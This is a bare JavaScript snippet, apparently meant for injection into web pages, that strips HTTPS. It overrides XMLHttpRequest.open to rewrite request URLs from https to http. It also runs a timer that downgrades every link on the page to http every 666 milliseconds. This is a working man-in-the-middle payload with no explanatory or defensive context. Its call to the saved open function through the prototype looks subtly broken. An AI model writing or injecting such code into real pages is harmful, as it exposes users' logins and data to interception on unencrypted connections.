XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
	obf_var_url = obf_var_url.replace(/^(http)s/ig, "$1")
	XMLHttpRequest.prototype.obf_open(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password)
}

setInterval(function(){
	document.querySelectorAll("a").forEach(function(obf_a){
		obf_a.href = obf_a.href.replace(/^(http)s/ig, "http")
	})
}, 666)
